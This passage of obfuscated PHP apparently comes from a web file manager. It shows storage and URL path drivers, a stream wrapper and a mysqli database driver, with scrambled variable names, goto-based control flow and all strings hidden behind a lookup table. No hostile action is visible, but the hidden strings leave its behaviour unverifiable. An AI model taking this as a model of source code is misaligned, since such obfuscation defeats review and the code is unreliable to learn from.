$Cá«©ØØ¥Ä = false, $a¶ÉàŞº¶Š = false, $f·˜ÛàÚë = '') { parent::fileOut($CÑ•Ú†¹ùŠ, $Cá«©ØØ¥Ä, $a¶ÉàŞº¶Š, $f·˜ÛàÚë); } public function fileOutImage($A÷š·ÔÙãÏ, $Aò›‰ƒºÕ´ = 250) { $b°›”­İ† = $this->link($A÷š·ÔÙãÏ . $_SERVER[ÚŠ•´ÍéÒÑÔ][1269] . $Aò›‰ƒºÕ´); $this->fileOutLink($b°›”­İ†); } public function fileOutImageServer($aŠ°İ¥ˆ‘¿, $A­ ‡ª’ “ = 250) { parent::fileOutImage($aŠ°İ¥ˆ‘¿, $A­ ‡ª’ “); } public function hashMd5($aÂ¢ÅÏÕ˜) { $Eº‡ğ…²­© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eš¢ìÒÈó‹ = $this->objectMeta($aÂ¢ÅÏÕ˜); return isset($eš¢ìÒÈó‹[$Eº‡ğ…²­©[193]]) ? $eš¢ìÒÈó‹[$Eº‡ğ…²­©[193]] : !1; } public function size($CÄ›ó…Î—Ë) { $cÆ˜ºµå¨Ú = $this->objectMeta($CÄ›ó…Î—Ë); return $cÆ˜ºµå¨Ú ? $cÆ˜ºµå¨Ú[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]] : 0; } public function info($Eèõ²ê’Ü·) { if ($this->isFolder($Eèõ²ê’Ü·)) { return $this->folderInfo($Eèõ²ê’Ü·); } else { if ($this->isFile($Eèõ²ê’Ü·)) { return $this->fileInfo($Eèõ²ê’Ü·); } } return !1; } public function exist($AÈ¯‹í‡ÆÊ) { return $this->isFile($AÈ¯‹í‡ÆÊ) || $this->isFolder($AÈ¯‹í‡ÆÊ); } public function isFile($C‚İæÃìŸØ) { return !$this->isFolder($C‚İæÃìŸØ) && $this->objectMeta($C‚İæÃìŸØ); } public function isFolder($D¹ÍÕ»ˆ¡İ) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][220], $D¹ÍÕ»ˆ¡İ); } protected function objectMeta($E‚¿ğî­¹²) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][221], $E‚¿ğî­¹²); } protected function _objectMeta($c¯‡©ĞœÖ«) { goto FÌî×¥¢™ã; FÌî×¥¢™ã: $eÒˆººñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($c¯‡©ĞœÖ« == $eÒˆººñ[33] || $c¯‡©ĞœÖ« == $eÒˆººñ[8]) { return array(); } $D¬è ¼ôÒ = $this->ussRequest($c¯‡©ĞœÖ«, $eÒˆººñ[1270]); goto eà¡Æ¾ÆİÃ; eà¡Æ¾ÆİÃ: if (!$D¬è ¼ôÒ[$eÒˆººñ[1024]]) { return null; } $e»ğÓÓÎÇÂ = isset($D¬è ¼ôÒ[$eÒˆººñ[1026]]) ? $D¬è ¼ôÒ[$eÒˆººñ[1026]] : array(); if (!isset($e»ğÓÓÎÇÂ[$eÒˆººñ[1271]])) { return null; } goto eä¡×‘àÍÄ; eä¡×‘àÍÄ: $A·‡Ù‡Èî‚ = array($eÒˆººñ[28] => get_path_this($c¯‡©ĞœÖ«), $eÒˆººñ[29] => isset($e»ğÓÓÎÇÂ[$eÒˆººñ[1271]]) ? $e»ğÓÓÎÇÂ[$eÒˆººñ[1271]] : null, $eÒˆººñ[77] => isset($e»ğÓÓÎÇÂ[$eÒˆººñ[1272]]) ? $e»ğÓÓÎÇÂ[$eÒˆººñ[1272]] : null, $eÒˆººñ[193] => isset($e»ğÓÓÎÇÂ[$eÒˆººñ[1273]]) ? $e»ğÓÓÎÇÂ[$eÒˆººñ[1273]] : null, $eÒˆººñ[1240] => isset($e»ğÓÓÎÇÂ[$eÒˆººñ[1274]]) ? $e»ğÓÓÎÇÂ[$eÒˆººñ[1274]] : null); $A·‡Ù‡Èî‚[$eÒˆººñ[1241]] = isset($e»ğÓÓÎÇÂ[$eÒˆººñ[1275]]) ? strtotime($e»ğÓÓÎÇÂ[$eÒˆººñ[1275]]) : $A·‡Ù‡Èî‚[$eÒˆººñ[1240]]; return $A·‡Ù‡Èî‚; goto cùÓğ¼†òô; cùÓğ¼†òô: } protected function _isFolder($f¾Ù‰Œ÷áŒ) { $BÀÉé¿ŠŞß =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($f¾Ù‰Œ÷áŒ == $BÀÉé¿ŠŞß[33] || $f¾Ù‰Œ÷áŒ == $BÀÉé¿ŠŞß[8]) { return !0; } $AâÀ¼Æé = $this->objectMeta($f¾Ù‰Œ÷áŒ); return isset($AâÀ¼Æé[$BÀÉé¿ŠŞß[29]]) && $AâÀ¼Æé[$BÀÉé¿ŠŞß[29]] == $BÀÉé¿ŠŞß[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($eÇ¨ÃÇ„®ø = false) { } public function exist($aù¾ğ¡“ª) { $bå‰¼á¤ = $this->info($aù¾ğ¡“ª); return $bå‰¼á¤[$_SERVER[ÚŠ•´ÍéÒÑÔ][185]]; } public function isFile($CÆâçá×´ƒ) { $cœªğ„ì¥¡ = $this->info($CÆâçá×´ƒ); return $cœªğ„ì¥¡[$_SERVER[ÚŠ•´ÍéÒÑÔ][185]]; } public function isFolder($FØš±¤Œî‚) { return !1; } public function size($eæÁ¬Ñİ÷É) { $e‡Çá°è¾© = $this->info($eæÁ¬Ñİ÷É); return $e‡Çá°è¾©[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]]; } public function info($CÂÚø°¨œ¥) { return $this->infoParse($CÂÚø°¨œ¥); } public function infoAuth($FµíßĞ¤•º) { return $this->infoParse($FµíßĞ¤•º); } public function infoWithChildren($BØÅÈ‚ëñœ) { return $this->infoParse($BØÅÈ‚ëñœ); } public function infoFull($c§„ˆİá…¦) { return $this->infoParse($c§„ˆİá…¦); } private function infoParse($C‚»Ì·ç„) { $BÄ³÷Â­’× =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D±±ô†È© = $this->header($C‚»Ì·ç„); if (!$D±±ô†È© || !$D±±ô†È©[$BÄ³÷Â­’×[684]]) { return !1; } $dÂ–‰ÁÂ‘‚ = _get($D±±ô†È©, $BÄ³÷Â­’×[322], 0); $E“ÜœÇ¤¿‡ = array($BÄ³÷Â­’×[28] => $D±±ô†È©[$BÄ³÷Â­’×[28]], $BÄ³÷Â­’×[75] => $C‚»Ì·ç„, $BÄ³÷Â­’×[29] => $BÄ³÷Â­’×[164], $BÄ³÷Â­’×[77] => intval($dÂ–‰ÁÂ‘‚), $BÄ³÷Â­’×[157] => get_path_ext($D±±ô†È©[$BÄ³÷Â­’×[28]]), $BÄ³÷Â­’×[1146] => $dÂ–‰ÁÂ‘‚ > 0 && $D±±ô†È©[$BÄ³÷Â­’×[1276]], $BÄ³÷Â­’×[1147] => !1); return $E“ÜœÇ¤¿‡; } private function header($cŞâ¢‹Ğƒ) { if (isset(self::$_cacheHeader[$cŞâ¢‹Ğƒ])) { return self::$_cacheHeader[$cŞâ¢‹Ğƒ]; } self::$_cacheHeader[$cŞâ¢‹Ğƒ] = url_header($cŞâ¢‹Ğƒ); return self::$_cacheHeader[$cŞâ¢‹Ğƒ]; } public function hashSimple($C¾’’£È‰Ñ, $BÄÊÑİªŠŞ = false) { goto c¾‹•Û´Î; c¾‹•Û´Î: $açó’·¹ì© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a›è¶¶íó¸ = $this->info($C¾’’£È‰Ñ); if (!$a›è¶¶íó¸ || !$a›è¶¶íó¸[$açó’·¹ì©[185]]) { return !1; } goto BŠğÂÅòƒ; aÍ¢¤«ù—õ: if ($CÅ¢ôâ¡¬’ <= $aÇ°Ä—Ş±¢ * $D·”ô¥ß¨ª) { return md5($this->fileSubstr($C¾’’£È‰Ñ, 0, $CÅ¢ôâ¡¬’)) . $CÅ¢ôâ¡¬’; } $a©†Îôñé = intval($CÅ¢ôâ¡¬’ / $D·”ô¥ß¨ª); $cÊ¡‹¸‰½É = $açó’·¹ì©[33]; goto D‘Ê’ä˜ï; BŠğÂÅòƒ: $CÅ¢ôâ¡¬’ = $a›è¶¶íó¸[$açó’·¹ì©[77]]; $aÇ°Ä—Ş±¢ = 200; $D·”ô¥ß¨ª = 50; goto aÍ¢¤«ù—õ; CØå†ÚÜ°: $cÊ¡‹¸‰½É .= $this->fileSubstr($C¾’’£È‰Ñ, $CÅ¢ôâ¡¬’ - $aÇ°Ä—Ş±¢, $aÇ°Ä—Ş±¢); return md5($cÊ¡‹¸‰½É) . $CÅ¢ôâ¡¬’; goto Aƒº…Ûô¨; D‘Ê’ä˜ï: $f™«ÀŠ‡òà = timeFloat(); $bŒî„òÎ±ï = 15; for ($aêì× £½Ö = 0; $aêì× £½Ö < $D·”ô¥ß¨ª; $aêì× £½Ö++) { if (timeFloat() - $f™«ÀŠ‡òà > $bŒî„òÎ±ï) { return !1; } $cÅŸ‰†¿Ã‚ = $this->fileSubstr($C¾’’£È‰Ñ, $a©†Îôñé * $aêì× £½Ö, $aÇ°Ä—Ş±¢); if (!$cÅŸ‰†¿Ã‚) { return !1; } $cÊ¡‹¸‰½É .= $cÅŸ‰†¿Ã‚; } goto CØå†ÚÜ°; Aƒº…Ûô¨: } public function getContent($fíÄ¸ æ‘Ó) { return $this->fileSubstr($fíÄ¸ æ‘Ó); } public function fileSubstr($DøÙ ØÏ±«, $Aøõ¦é‰Ä = 0, $DŒˆ±ÍŠ¯ë = -1) { goto aƒŸ‹¨ˆİ; aƒŸ‹¨ˆİ: $cÕ¸ã÷‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a×ôùÕ¦ = $this->info($DøÙ ØÏ±«); if (!$a×ôùÕ¦ || !$a×ôùÕ¦[$cÕ¸ã÷‘[185]] && $a×ôùÕ¦[$cÕ¸ã÷‘[77]] > 1024 * 1024 * 10) { return !1; } goto c»¾øäô‡›; c»¾øäô‡›: if ($DŒˆ±ÍŠ¯ë === -1) { $DŒˆ±ÍŠ¯ë = $a×ôùÕ¦[$cÕ¸ã÷‘[77]]; } if ($DŒˆ±ÍŠ¯ë == 0) { return $cÕ¸ã÷‘[33]; } $Eìãçù÷à¤ = array($cÕ¸ã÷‘[1277] . $Aøõ¦é‰Ä . $cÕ¸ã÷‘[709] . ($Aøõ¦é‰Ä + $DŒˆ±ÍŠ¯ë - 1)); goto Bç¤äèÅÆ©; Bç¤äèÅÆ©: $DĞ‰¯…ˆ§ = url_request($DøÙ ØÏ±«, $cÕ¸ã÷‘[213], !1, $Eìãçù÷à¤, !1, !1, 1); return $DĞ‰¯…ˆ§[$cÕ¸ã÷‘[1026]] ? $DĞ‰¯…ˆ§[$cÕ¸ã÷‘[1026]] : $cÕ¸ã÷‘[33]; goto A‡…‚ïÇ³; A‡…‚ïÇ³: } public function download($C‹à‚•¥Ç, $E”÷‡“ª×Ÿ) { Downloader::start($C‹à‚•¥Ç, $E”÷‡“ª×Ÿ); return $E”÷‡“ª×Ÿ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($c‡‚»Ì‡¼¥, $E’§°Ï‹‹ = '') { goto e×ÒÑÕ¢İ´; e×ÒÑÕ¢İ´: $this->info = $this->info($c‡‚»Ì‡¼¥); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]]; goto Fñ—­†¸Å; f§÷îÉ¼¥°: return $this->info ? !0 : !1; goto A”†âù¥¨Ó; Fñ—­†¸Å: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$c‡‚»Ì‡¼¥])) { self::$_chunkBuffer[$c‡‚»Ì‡¼¥] = array(); } goto f§÷îÉ¼¥°; A”†âù¥¨Ó: } function stream_read($c¾é ÕïØ‡) { $b©™ùßŒÏÃ = $this->fileSubstr($this->pose, $c¾é ÕïØ‡); $this->pose += strlen($b©™ùßŒÏÃ); return $b©™ùßŒÏÃ; } public function stream_tell() { return $this->pose; } public function stream_seek($A…Î÷³ó¨Ê, $b‡Ä‚¸á¨) { $AëÛ¦‡— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($b‡Ä‚¸á¨ == SEEK_SET) { $this->pose = $A…Î÷³ó¨Ê; } else { if ($b‡Ä‚¸á¨ == SEEK_CUR) { $this->pose += $A…Î÷³ó¨Ê; } else { if ($b‡Ä‚¸á¨ == SEEK_END) { $this->pose = $this->info[$AëÛ¦‡—[77]] + intval($A…Î÷³ó¨Ê); } } } if ($A…Î÷³ó¨Ê < 0) { $this->pose = $this->info[$AëÛ¦‡—[77]] + $A…Î÷³ó¨Ê; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]]; } public function stream_close() { return !0; } public function url_stat($DØ¼¨ÁÈÛ, $Eš¨ñÒ½) { $C£Òô¢¤áÀ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fßÆ­˜âğğ = $this->info($DØ¼¨ÁÈÛ); return array($C£Òô¢¤áÀ[1278] => 0, $C£Òô¢¤áÀ[1279] => 0, $C£Òô¢¤áÀ[12] => 32768 + 511, $C£Òô¢¤áÀ[1280] => 0, $C£Òô¢¤áÀ[1281] => 0, $C£Òô¢¤áÀ[1282] => 0, $C£Òô¢¤áÀ[1283] => 0, $C£Òô¢¤áÀ[77] => $fßÆ­˜âğğ[$C£Òô¢¤áÀ[77]], $C£Òô¢¤áÀ[1284] => $fßÆ­˜âğğ[$C£Òô¢¤áÀ[1155]], $C£Òô¢¤áÀ[1241] => $fßÆ­˜âğğ[$C£Òô¢¤áÀ[107]], $C£Òô¢¤áÀ[1240] => $fßÆ­˜âğğ[$C£Òô¢¤áÀ[184]], $C£Òô¢¤áÀ[1285] => 0, $C£Òô¢¤áÀ[1286] => 0); } static $fileInfo = array(); public function info($AæÓÓí‰Ò) { $c¨Ÿ¼ù˜×‘ = $_SERVER[ÚŠ•´ÍéÒÑÔ][1287]; if (isset(self::$fileInfo[$AæÓÓí‰Ò])) { return self::$fileInfo[$AæÓÓí‰Ò]; } if (substr($AæÓÓí‰Ò, 0, strlen($c¨Ÿ¼ù˜×‘)) != $c¨Ÿ¼ù˜×‘) { return !1; } self::$fileInfo[$AæÓÓí‰Ò] = IO::info(substr($AæÓÓí‰Ò, strlen($c¨Ÿ¼ù˜×‘))); return self::$fileInfo[$AæÓÓí‰Ò]; } public static function read($bÕë‹‡òŒŠ, $cë‚öä´, $eª¾ã¶ªŒ¤) { goto DñùÄÓÛÓ; d®ë±ùµ‘ò: return $d»Ë¤ç²¯; goto F»‘ÇÄÇ¿; DñùÄÓÛÓ: $eíô›©­” =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F¡İ¨†İîë = fopen($bÕë‹‡òŒŠ, $eíô›©­”[1157]); if (!$F¡İ¨†İîë) { return $eíô›©­”[33]; } goto f§‰ÂËÕ¨; Bö‚¹åë: $bĞ‡ØÕ…ó¾ = 0; while ($bĞ‡ØÕ…ó¾ < $eª¾ã¶ªŒ¤) { $Aµä•ïÌÎ = min($AÊ±Öíê¶, $eª¾ã¶ªŒ¤ - $bĞ‡ØÕ…ó¾); $d»Ë¤ç²¯ .= fread($F¡İ¨†İîë, $Aµä•ïÌÎ); $bĞ‡ØÕ…ó¾ += $Aµä•ïÌÎ; } fclose($F¡İ¨†İîë); goto d®ë±ùµ‘ò; f§‰ÂËÕ¨: $AÊ±Öíê¶ = 8192; fseek($F¡İ¨†İîë, $cë‚öä´, SEEK_SET); $d»Ë¤ç²¯ = $eíô›©­”[33]; goto Bö‚¹åë; F»‘ÇÄÇ¿: } public function fileSubstr($E…¬÷‚â¤Ğ, $fÄÚíèÀâê) { goto aİ÷ÖÉ¾“‚; aİ÷ÖÉ¾“‚: $d…Ôˆì¬É³ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aµˆÃƒ”‡› = $this->info[$d…Ôˆì¬É³[77]]; $e†‘ŸœÌ¬… = $E…¬÷‚â¤Ğ; goto cÈÖ¸·‰äâ; fÊË¯ĞÚ×: $EĞÃã‘Ãè = 0; $D¨óõºÖ¹ = 0; $fŒŠâ‹ÛÄ¾ = $d…Ôˆì¬É³[33]; goto cÄµƒ¨Ûº; f×„®ÚÎæº: ksort($AˆÒ»§ÇëÉ); $cÍëîôßò» = substr($a¿¯õŞß¢È, $E…¬÷‚â¤Ğ - $CŠ¸ÎÃîÕâ, $fÄÚíèÀâê); return $cÍëîôßò»; goto aÑ»é¡‹´Ê; E³ÏŞ‚–˜Ô: if ($E…¬÷‚â¤Ğ + $fÄÚíèÀâê > $aµˆÃƒ”‡›) { $fÄÚíèÀâê = $aµˆÃƒ”‡› - $E…¬÷‚â¤Ğ; } if ($fÄÚíèÀâê <= 0) { return $d…Ôˆì¬É³[33]; } if ($E…¬÷‚â¤Ğ < 0 || $E…¬÷‚â¤Ğ >= $aµˆÃƒ”‡› || $fÄÚíèÀâê <= 0 || $fÄÚíèÀâê > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\x69\154\x65\x52\x65\x61\x64\x20\x65\162\162\x6f\x72\x21\40\x73\164\141\x72\x74\75{$E…¬÷‚â¤Ğ}\73\x6c\145\156\147\164\x68\x3d{$fÄÚíèÀâê}\x3b\40\163\x69\x7a\x65\75{$aµˆÃƒ”‡›}\x3b"); } goto Aó‚¦†Æ»; Aó‚¦†Æ»: $f© ç¶‹÷ = 64 * 1024; $AˆÒ»§ÇëÉ =& self::$_chunkBuffer[$this->path]; if (!$AˆÒ»§ÇëÉ) { $AˆÒ»§ÇëÉ = array(); } goto fÊË¯ĞÚ×; BÚ¢Õø„¹‹: $dùáƒÀ®à÷ = ceil(($E…¬÷‚â¤Ğ + $fÄÚíèÀâê) / $f© ç¶‹÷) * $f© ç¶‹÷ - $CŠ¸ÎÃîÕâ; $a¿¯õŞß¢È = IO::fileSubstr($this->path, $CŠ¸ÎÃîÕâ, $dùáƒÀ®à÷); $AˆÒ»§ÇëÉ[$CŠ¸ÎÃîÕâ . $d…Ôˆì¬É³[33]] = $a¿¯õŞß¢È; goto f×„®ÚÎæº; cÈÖ¸·‰äâ: $b‘óØ·‚ƒÍ = $fÄÚíèÀâê; if ($E…¬÷‚â¤Ğ < 0) { $E…¬÷‚â¤Ğ = $aµˆÃƒ”‡› + $E…¬÷‚â¤Ğ; } if ($fÄÚíèÀâê === !1) { $fÄÚíèÀâê = $aµˆÃƒ”‡› - $E…¬÷‚â¤Ğ; } goto E³ÏŞ‚–˜Ô; cÄµƒ¨Ûº: foreach ($AˆÒ»§ÇëÉ as $EĞÃã‘Ãè => $fŒŠâ‹ÛÄ¾) { $EĞÃã‘Ãè = intval($EĞÃã‘Ãè); $D¨óõºÖ¹ = $EĞÃã‘Ãè + strlen($fŒŠâ‹ÛÄ¾); if ($E…¬÷‚â¤Ğ >= $D¨óõºÖ¹) { continue; } if ($E…¬÷‚â¤Ğ >= $EĞÃã‘Ãè && $E…¬÷‚â¤Ğ + $fÄÚíèÀâê <= $D¨óõºÖ¹) { return substr($fŒŠâ‹ÛÄ¾, $E…¬÷‚â¤Ğ - $EĞÃã‘Ãè, $fÄÚíèÀâê); } break; } if (count($AˆÒ»§ÇëÉ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($d…Ôˆì¬É³[1288], $d…Ôˆì¬É³[1289] . count($AˆÒ»§ÇëÉ) . "\x3b\163\164\141\162\164\x3d{$E…¬÷‚â¤Ğ}\x2c\x6c\145\x6e\x67\164\x68\x3d{$fÄÚíèÀâê}\x3b\x70\x6f\x73\145\72{$EĞÃã‘Ãè}\x7e{$D¨óõºÖ¹}"); throw new Exception($d…Ôˆì¬É³[1290]); } $CŠ¸ÎÃîÕâ = intval($E…¬÷‚â¤Ğ / $f© ç¶‹÷) * $f© ç¶‹÷; goto BÚ¢Õø„¹‹; aÑ»é¡‹´Ê: } private function log($d½ŒÆ‘ë¡³, $béñ¿ŒÀ¸) { $b´‹˜éˆÆŠ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B­¶ä¦íÊ‘ = timeFloat() - $this->timeStart; write_log(sprintf($b´‹˜éˆÆŠ[1291], $d½ŒÆ‘ë¡³, $this->info[$b´‹˜éˆÆŠ[28]], $B­¶ä¦íÊ‘, $béñ¿ŒÀ¸), $b´‹˜éˆÆŠ[1206]); } } goto aœÖœƒ‚Ø; Cßƒë‹¡ŸÅ: class DbMysqli extends Db { public function __construct($cƒîäç±¨— = '') { $EÏÙâ¤¥›² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!extension_loaded($EÏÙâ¤¥›²[722])) { think_exception(think_lang($EÏÙâ¤¥›²[10]) . $EÏÙâ¤¥›²[819]); } if (!empty($cƒîäç±¨—)) { $this->config = $cƒîäç±¨—; if (empty($this->config[$EÏÙâ¤¥›²[13]])) { $this->config[$EÏÙâ¤¥›²[13]] = $EÏÙâ¤¥›²[33]; } } } public function connect($b²„¬½‡»ë = '', $F»•ˆòì¶ï = 0) { $e´Üñ‘ÉÓÁ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($this->linkID[$F»•ˆòì¶ï])) { goto DÜ°ğÑĞÊë; DÜ°ğÑĞÊë: if (empty($b²„¬½‡»ë)) { $b²„¬½‡»ë = $this->config; } $this->linkID[$F»•ˆòì¶ï] = new mysqli($b²„¬½‡»ë[$e´Üñ‘ÉÓÁ[793]], $b²„¬½‡»ë[$e´Üñ‘ÉÓÁ[795]], $b²„¬½‡»ë[$e´Üñ‘ÉÓÁ[796]], $b²„¬½‡»ë[$e´Üñ‘ÉÓÁ[17]], $b²„¬½‡»ë[$e´Üñ‘ÉÓÁ[794]] ? intval($b²„¬½‡»ë[$e´Üñ‘ÉÓÁ[794]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto E‚ôó¸´âõ; DˆÑÔšò»‰: $this->connected = !0; if (1 != think_config($e´Üñ‘ÉÓÁ[18])) { unset($this->config); } goto aî«†…é÷; E‚ôó¸´âõ: $bã×Ş¡äÕ‘ = $this->linkID[$F»•ˆòì¶ï]->server_version; $this->linkID[$F»•ˆòì¶ï]->query($e´Üñ‘ÉÓÁ[797] . think_config($e´Üñ‘ÉÓÁ[798]) . $e´Üñ‘ÉÓÁ[55]); if ($bã×Ş¡äÕ‘ > $e´Üñ‘ÉÓÁ[799]) { $this->linkID[$F»•ˆòì¶ï]->query($e´Üñ‘ÉÓÁ[800]); } goto DˆÑÔšò»‰; aî«†…é÷: } return $this->linkID[$F»•ˆòì¶ï]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($C»íä‡Øæö) { goto dÅİİ®„ÎÛ; dÅİİ®„ÎÛ: $b»ˆ¬Âäé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b¸é»õ­Ê»; b¸é»õ­Ê»: $this->queryStr = $C»íä‡Øæö; if ($this->queryID) { $this->free(); } think_action_status($b»ˆ¬Âäé[19], 1); goto aà´šÇ¥æî; aà´šÇ¥æî: think_status($b»ˆ¬Âäé[20]); $this->queryID = $this->_linkID->query($C»íä‡Øæö); if ($this->_linkID->more_results()) { while (($Fã˜¸çÜöë = $this->_linkID->next_result()) != NULL) { $Fã˜¸çÜöë->free_result(); } } goto A±ˆ‰·ÁëŒ; A±ˆ‰·ÁëŒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto CÔ´ë§†Ş; CÔ´ë§†Ş: } public function execute($AÖ›‘¤ËàÁ) { goto D‘ô­‰­¿Ç; fã‡¥àà: if (!1 === $C–†¿ä«¯À) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto eÏòÚÎÎõ; Aê©ÒŒšˆÙ: $this->queryStr = $AÖ›‘¤ËàÁ; if ($this->queryID) { $this->free(); } think_action_status($Dƒ¸ÖŠ·¼[21], 1); goto aùŠ¾à„˜; D‘ô­‰­¿Ç: $Dƒ¸ÖŠ·¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aê©ÒŒšˆÙ; aùŠ¾à„˜: think_status($Dƒ¸ÖŠ·¼[20]); $C–†¿ä«¯À = $this->_linkID->query($AÖ›‘¤ËàÁ); $this->debug(); goto fã‡¥àà; eÏòÚÎÎõ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cÖ¢Ó®İŠ‰ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$cÖ¢Ó®İŠ‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E®‰Œêà = $this->_linkID->rollback(); $this->transTimes = 0; if (!$E®‰Œêà) { $this->error(); return !1; } } return !0; } private function getAll() { $E…îµ„å³ê = array(); if ($this->numRows > 0) { for ($b¡­ç¯é = 0; $b¡­ç¯é < $this->numRows; $b¡­ç¯é++) { $E…îµ„å³ê[$b¡­ç¯é] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $E…îµ„å³ê; } public function getFields($cäÄëãà±) { $A‘®¢¼Ì ¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fª„‚öêË™ = $this->query($A‘®¢¼Ì ¥[804] . $this->parseKey($cäÄëãà±)); $b¾¯„÷ÊÄ = array(); if ($Fª„‚öêË™) { foreach ($Fª„‚öêË™ as $f¾±¡ïÚÉÃ => $FÉØ‚Î‰) { $b¾¯„÷ÊÄ[$FÉØ‚Î‰[$A‘®¢¼Ì ¥[27]]] = array($A‘®¢¼Ì ¥[28] => $FÉØ‚Î‰[$A‘®¢¼Ì ¥[27]], $A‘®¢¼Ì ¥[29] => $FÉØ‚Î‰[$A‘®¢¼Ì ¥[30]], $A‘®¢¼Ì ¥[31] => (bool) ($FÉØ‚Î‰[$A‘®¢¼Ì ¥[32]] === $A‘®¢¼Ì ¥[33]), $A‘®¢¼Ì ¥[34] => $FÉØ‚Î‰[$A‘®¢¼Ì ¥[35]], $A‘®¢¼Ì ¥[36] => strtolower($FÉØ‚Î‰[$A‘®¢¼Ì ¥[37]]) == $A‘®¢¼Ì ¥[38], $A‘®¢¼Ì ¥[39] => strtolower($FÉØ‚Î‰[$A‘®¢¼Ì ¥[40]]) == $A‘®¢¼Ì ¥[41]); } } return $b¾¯„÷ÊÄ; } public function getTables($C ñœë‹’ = '') { $dŞ ±¶…Î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aí®Ñí‡º = !empty($C ñœë‹’) ? $dŞ ±¶…Î[806] . $C ñœë‹’ : $dŞ ±¶…Î[807]; $E‹Á¼Ë‹Ş = $this->query($aí®Ñí‡º); $a®í¢³ªÛ = array(); if ($E‹Á¼Ë‹Ş) { foreach ($E‹Á¼Ë‹Ş as $C¦‘¦Åœå => $FØ²ÍŠÂù) { $a®í¢³ªÛ[$C¦‘¦Åœå] = current($FØ²ÍŠÂù); } } return $a®í¢³ªÛ; } public function replace($e–„ã¸¢™Ë, $däÙöÌ½‘ = array()) { $AŒÔå¾ÂÑò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($e–„ã¸¢™Ë as $F…¥ÇòáˆĞ => $EŞ×ñ‚ê¶) { $eˆĞíµ ÔÌ = $this->parseValue($EŞ×ñ‚ê¶); if (is_scalar($eˆĞíµ ÔÌ)) { $fõ„……Ü…±[] = $eˆĞíµ ÔÌ; $Eßğ¬»õÀ[] = $this->parseKey($F…¥ÇòáˆĞ); } } $cª«’Ãë—¶ = $AŒÔå¾ÂÑò[808] . $this->parseTable($däÙöÌ½‘[$AŒÔå¾ÂÑò[264]]) . $AŒÔå¾ÂÑò[809] . implode($AŒÔå¾ÂÑò[47], $Eßğ¬»õÀ) . $AŒÔå¾ÂÑò[810] . implode($AŒÔå¾ÂÑò[47], $fõ„……Ü…±) . $AŒÔå¾ÂÑò[811]; return $this->execute($cª«’Ãë—¶); } public function insertAll($Dæê…ÈéÖ, $föß´À±‰÷ = array(), $F‰§ÒÙïŒÌ = false) { goto cÜ–†‡²Ø; FÚ–ìö•öÏ: $b‘‰İ‘õê” = array(); foreach ($Dæê…ÈéÖ as $B¬ØÕÅ‚‰ƒ) { $BÎ‡¯ÖÌ„ = array(); foreach ($B¬ØÕÅ‚‰ƒ as $f”æºôÁ¦ => $bã‘Ò½–Ç) { $bã‘Ò½–Ç = $this->parseValue($bã‘Ò½–Ç); if (is_scalar($bã‘Ò½–Ç)) { $BÎ‡¯ÖÌ„[] = $bã‘Ò½–Ç; } } $b‘‰İ‘õê”[] = $bÛğ»ÃÎ°ä[245] . implode($bÛğ»ÃÎ°ä[47], $BÎ‡¯ÖÌ„) . $bÛğ»ÃÎ°ä[811]; } array_walk($cßòâŞ‘°, array($this, $bÛğ»ÃÎ°ä[812])); goto d…á·˜¬ïø; cÜ–†‡²Ø: $bÛğ»ÃÎ°ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!is_array($Dæê…ÈéÖ[0])) { return !1; } $cßòâŞ‘° = array_keys($Dæê…ÈéÖ[0]); goto FÚ–ìö•öÏ; d…á·˜¬ïø: $B˜í£‰äš× = ($F‰§ÒÙïŒÌ ? $bÛğ»ÃÎ°ä[813] : $bÛğ»ÃÎ°ä[814]) . 